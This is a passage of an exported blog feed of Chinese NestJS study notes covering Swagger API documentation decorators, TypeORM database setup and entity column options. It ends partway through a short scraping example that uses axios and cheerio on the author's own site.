<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071755099.png"></p>
<h1 id="整理接口文档"><a href="#整理接口文档" class="headerlink" title="整理接口文档"></a>整理接口文档</h1><h2 id="添加分组"><a href="#添加分组" class="headerlink" title="添加分组"></a>添加分组</h2><p>使用@ApiTags</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiTags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiTags</span>(<span class="string">&#x27;守卫&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071804937.png"></p>
<h2 id="接口描述"><a href="#接口描述" class="headerlink" title="接口描述"></a>接口描述</h2><p>使用@ApiOperation描述接口</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiOperation</span>, <span class="title class_">ApiTags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiTags</span>(<span class="string">&#x27;守卫&#x27;</span>)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="meta">@Role</span>(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">  <span class="meta">@ApiOperation</span>(&#123;</span><br><span class="line">    <span class="attr">summary</span>: <span class="string">&#x27;测试admin&#x27;</span>,</span><br><span class="line">    <span class="attr">description</span>: <span class="string">&#x27;请求该接口需要admin权限&#x27;</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"><span class="meta">@ReqUrl</span>(<span class="string">&#x27;I am data&#x27;</span>) url: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url, <span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071807689.png"></p>
<h2 id="Param参数描述"><a href="#Param参数描述" class="headerlink" title="Param参数描述"></a>Param参数描述</h2><p>使用@ApiParam描述Param参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiOperation</span>, <span class="title class_">ApiParam</span>, <span class="title class_">ApiTags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiTags</span>(<span class="string">&#x27;守卫&#x27;</span>)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="meta">@ApiParam</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;id&#x27;</span>, <span class="attr">description</span>: <span class="string">&#x27;主键&#x27;</span>, <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span> &#125;)</span><br><span class="line">  <span class="title function_">findOne</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findOne</span>(+id);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071811241.png"></p>
<h2 id="Query参数描述"><a href="#Query参数描述" class="headerlink" title="Query参数描述"></a>Query参数描述</h2><p>使用@ApiQuery描述Query参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiOperation</span>, <span class="title class_">ApiParam</span>, <span class="title class_">ApiQuery</span>, <span class="title class_">ApiTags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiTags</span>(<span class="string">&#x27;守卫&#x27;</span>)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="meta">@ApiQuery</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;page&#x27;</span>, <span class="attr">description</span>: <span class="string">&#x27;分页信息&#x27;</span> &#125;)</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"><span class="meta">@ReqUrl</span>(<span class="string">&#x27;I am data&#x27;</span>) url: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url, <span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071816301.png"></p>
<h2 id="返回信息描述"><a href="#返回信息描述" class="headerlink" title="返回信息描述"></a>返回信息描述</h2><p>使用@ApiResponse自定义返回信息</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiOperation</span>, <span class="title class_">ApiParam</span>, <span class="title class_">ApiQuery</span>, <span class="title class_">ApiResponse</span>, <span class="title class_">ApiTags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiTags</span>(<span class="string">&#x27;守卫&#x27;</span>)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="meta">@ApiResponse</span>(&#123; <span class="attr">status</span>: <span class="number">403</span>, <span class="attr">description</span>: <span class="string">&#x27;自定义返回信息&#x27;</span> &#125;)</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"><span class="meta">@ReqUrl</span>(<span class="string">&#x27;I am data&#x27;</span>) url: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url, <span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071820961.png"></p>
<h2 id="Post示例描述"><a href="#Post示例描述" class="headerlink" title="Post示例描述"></a>Post示例描述</h2><p>使用@ApiProperty描述Post示例</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ApiProperty</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CreateGuardDto</span> &#123;</span><br><span class="line">  <span class="meta">@ApiProperty</span>(&#123; <span class="attr">example</span>: <span class="string">&#x27;yajue&#x27;</span> &#125;)</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="meta">@ApiProperty</span>(&#123; <span class="attr">example</span>: <span class="number">24</span> &#125;)</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071827597.png"></p>
<h2 id="携带Bearer-Token"><a href="#携带Bearer-Token" class="headerlink" title="携带Bearer Token"></a>携带Bearer Token</h2><p>需要先开启配置：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> options = <span class="keyword">new</span> <span class="title class_">DocumentBuilder</span>()</span><br><span class="line">  .<span class="title function_">addBearerAuth</span>()</span><br><span class="line">  .<span class="title function_">setTitle</span>(<span class="string">&#x27;接口文档标题&#x27;</span>)</span><br><span class="line">  .<span class="title function_">setDescription</span>(<span class="string">&#x27;1145141919810&#x27;</span>)</span><br><span class="line">  .<span class="title function_">setVersion</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  .<span class="title function_">build</span>();</span><br></pre></td></tr></table></figure>

<p>在Controller中使用，也可以用于单个函数：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">ApiBearerAuth</span>,</span><br><span class="line">  <span class="title class_">ApiOperation</span>,</span><br><span class="line">  <span class="title class_">ApiParam</span>,</span><br><span class="line">  <span class="title class_">ApiQuery</span>,</span><br><span class="line">  <span class="title class_">ApiResponse</span>,</span><br><span class="line">  <span class="title class_">ApiTags</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@ApiBearerAuth</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在接口文档的这个按钮处设置Token</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071831824.png"></p>
<p>被修饰的接口在请求时会自动携带设置的Token</p>
<h2 id="更多接口"><a href="#更多接口" class="headerlink" title="更多接口"></a>更多接口</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308071834094.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>连接数据库</title>
    <url>/web/study/Nestjs/18.%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="TypeOrm"><a href="#TypeOrm" class="headerlink" title="TypeOrm"></a>TypeOrm</h1><p>TypeOrm是TypeScript中最成熟的对象关系映射器（ORM），因为它是用TypeScript编写的，所以可以很好地与Nest框架集成</p>
<p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save @nestjs/typeorm typeorm mysql2</span><br></pre></td></tr></table></figure>

<h1 id="引入TypeOrm"><a href="#引入TypeOrm" class="headerlink" title="引入TypeOrm"></a>引入TypeOrm</h1><p>在app.module.ts注册：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TypeOrmModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TestModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./test/test.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [</span><br><span class="line">    <span class="title class_">TypeOrmModule</span>.<span class="title function_">forRoot</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;mysql&#x27;</span>, <span class="comment">// 数据库类型</span></span><br><span class="line">      <span class="attr">username</span>: <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 账号</span></span><br><span class="line">      <span class="attr">password</span>: <span class="string">&#x27;cherry114514&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">      <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>, <span class="comment">// host</span></span><br><span class="line">      <span class="attr">port</span>: <span class="number">3306</span>, <span class="comment">// 端口</span></span><br><span class="line">      <span class="attr">database</span>: <span class="string">&#x27;nest&#x27;</span>, <span class="comment">// 数据库名</span></span><br><span class="line">      <span class="comment">// entities: [__dirname + &#x27;/**/*.entity&#123;.ts,.js&#125;&#x27;], // 实体文件</span></span><br><span class="line">      <span class="attr">synchronize</span>: <span class="literal">true</span>, <span class="comment">//是否自动将实体类同步到数据库，生产环境尽量不使用，可能出现问题，开发环境可以</span></span><br><span class="line">      <span class="attr">retryDelay</span>: <span class="number">500</span>, <span class="comment">// 重试连接数据库时间间隔</span></span><br><span class="line">      <span class="attr">retryAttempts</span>: <span class="number">10</span>, <span class="comment">//重试连接数据库次数</span></span><br><span class="line">      <span class="attr">autoLoadEntities</span>: <span class="literal">true</span>, <span class="comment">// 是否自动加载实体，forFeature()方法注册的每个实体都将自动添加到配置对象的实体数组中</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="title class_">TestModule</span>,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在Entities中定义实体：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Entity</span>, <span class="title class_">Column</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个实体</span></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="comment">// 定义一个自增列</span></span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义一个列</span></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">password</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在对应的Module中关联实体：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TestService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./test.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TestController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./test.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Test</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/testing&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TypeOrmModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="comment">// 使模块关联实体</span></span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">TypeOrmModule</span>.<span class="title function_">forFeature</span>([<span class="title class_">Test</span>])],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">TestController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">TestService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">TestModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>实体</title>
    <url>/web/study/Nestjs/19.%E5%AE%9E%E4%BD%93.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><p>实体是一个映射到数据库表的类</p>
<p>可以通过定义一个新类来创建一个实体，并用@Entity()标记：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Entity</span>, <span class="title class_">Column</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个实体</span></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="comment">// 定义一个自增id</span></span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>(<span class="string">&#x27;uuid&#x27;</span>)</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义一个列</span></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">password</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="列"><a href="#列" class="headerlink" title="列"></a>列</h1><p>列相当于实体中的属性</p>
<h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><p>自增主键：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line"><span class="attr">id</span>: <span class="built_in">number</span></span><br></pre></td></tr></table></figure>

<p>自增uuid：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PrimaryGeneratedColumn</span>(<span class="string">&#x27;uuid&#x27;</span>)</span><br><span class="line"><span class="attr">id</span>: <span class="built_in">number</span></span><br></pre></td></tr></table></figure>

<h2 id="列类型"><a href="#列类型" class="headerlink" title="列类型"></a>列类型</h2><p>给列指定详细的类型，和mysql类型是对应的</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Column</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;varchar&#x27;</span>, <span class="attr">length</span>: <span class="number">200</span> &#125;)</span><br><span class="line"><span class="attr">password</span>: <span class="built_in">string</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@Column</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;int&#x27;</span>&#125;)</span><br><span class="line"><span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期专用的装饰器</span></span><br><span class="line"><span class="meta">@CreateDateColumn</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;timestamp&#x27;</span> &#125;)</span><br><span class="line"><span class="attr">create_time</span>: <span class="title class_">Date</span></span><br></pre></td></tr></table></figure>

<h2 id="自动生成列"><a href="#自动生成列" class="headerlink" title="自动生成列"></a>自动生成列</h2><p>插入数据时会自动生成内容</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Generated</span>(<span class="string">&#x27;uuid&#x27;</span>)</span><br><span class="line"><span class="attr">uuid</span>:<span class="built_in">string</span></span><br></pre></td></tr></table></figure>

<h2 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h2><p>当列的字段只应有几个既定值时使用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Column</span>(&#123;</span><br><span class="line">  <span class="comment">// 需要指定属性type为&#x27;enum&#x27;，否则会报错</span></span><br><span class="line">  <span class="attr">type</span>:<span class="string">&#x27;enum&#x27;</span>,</span><br><span class="line">  <span class="comment">// 属性enum的值可以是TS枚举，也可以是数组</span></span><br><span class="line">  <span class="attr">enum</span>:[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>],</span><br><span class="line">  <span class="comment">// 指定默认值</span></span><br><span class="line">  <span class="attr">default</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="attr">xx</span>: <span class="built_in">string</span></span><br></pre></td></tr></table></figure>

<h2 id="列选项"><a href="#列选项" class="headerlink" title="列选项"></a>列选项</h2><p>常用的列选项：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Column</span>(&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&#x27;varchar&#x27;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;ip&#x27;</span>, <span class="comment">// 数据库表中的列名</span></span><br><span class="line">  <span class="attr">nullable</span>: <span class="literal">true</span>, <span class="comment">// 在数据库中使列NULL或NOT NULL（能否为空），默认为false</span></span><br><span class="line">  <span class="attr">comment</span>: <span class="string">&#x27;注释&#x27;</span>,</span><br><span class="line">  <span class="attr">select</span>: <span class="literal">true</span>,  <span class="comment">// 在进行查询时是否显示此列；若为false，字段将被过滤，不返回给用户；默认为true</span></span><br><span class="line">  <span class="attr">default</span>: <span class="string">&#x27;xxxx&#x27;</span>, <span class="comment">// 数据库级列的DEFAULT值</span></span><br><span class="line">  <span class="attr">primary</span>: <span class="literal">false</span>, <span class="comment">// 将列标记为主要列，使用方式和@PrimaryColumn相同</span></span><br><span class="line">  <span class="attr">update</span>: <span class="literal">true</span>, <span class="comment">// &quot;save&quot;操作是否更新列值；若为false，只能在第一次插入对象时编写该值；默认为true</span></span><br><span class="line">  <span class="attr">collation</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 定义列排序规则</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="attr">ip</span>: <span class="built_in">string</span>;</span><br></pre></td></tr></table></figure>

<p>所有选项：<a href="https://typeorm.io/entities#column-options">Column options</a></p>
<h2 id="simple-array列类型"><a href="#simple-array列类型" class="headerlink" title="simple-array列类型"></a>simple-array列类型</h2><p>特殊列类型simple-array，可以将原始数组值存储在单个字符串列中，之中所有值都以逗号分隔（JSON数组）</p>
<p>之中存放的数组项不应该含有逗号，否则可能会出现数组切割的问题</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Column</span>(<span class="string">&#x27;simple-array&#x27;</span>)</span><br><span class="line">  <span class="attr">names</span>: <span class="built_in">string</span>[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="simple-json列类型"><a href="#simple-json列类型" class="headerlink" title="simple-json列类型"></a>simple-json列类型</h2><p>特殊列类型simple-json，可以将对象转换为json字符串，并存储在数据库中，反之亦可</p>
<p>用于数据库中没有json类型、却又需要存储和加载对象的场景</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Column</span>(<span class="string">&quot;simple-json&quot;</span>)</span><br><span class="line">  <span class="attr">profile</span>: &#123; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">nickname</span>: <span class="built_in">string</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫</title>
    <url>/web/study/Nestjs/14.%E7%88%AC%E8%99%AB.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>爬虫是一个对计算机综合能力要求比较高的技术活。</p>
<p>首先，要对网络协议，尤其是http协议，有基本的了解，能够分析网站的数据请求响应</p>
<p>其次，需要使用一些工具，简单的场景下使用chrome devtools的network面板足矣，除此之外还有服务端工具：</p>
<ul>
<li>cheerio：jQuery核心功能的一个快速灵活而又简洁的实现，主要用于服务器端操作DOM</li>
<li>axios：网络请求库，可以发送http请求</li>
</ul>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>以👶的<a href="/gallery/collect/meme.html">某个图册</a>为例</p>
<p>第一步：分析HTML结构，像我这里因为所有的图片url数据都被保存在了这里所以很好懂</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308051919779.png"></p>
<p>第二步：用代码读取所有图片，按照实际的HTML结构编写代码，可能会需要换页、点击等</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getImgs</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> body = <span class="keyword">await</span> axios</span><br><span class="line">    .<span class="title function_">get</span>(<span class="string">&#x27;https://cheriko.fun/gallery/collect/meme.html&#x27;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="property">data</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这下就可以用jq方式操作html字符串了</span></span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(body);</span><br><span class="line">  <span class="comment">// 逻辑需要根据具体页面内容和结构来写</span></span><br><span class="line">  <span class="keyword">const</span> loadBtn = $(<span 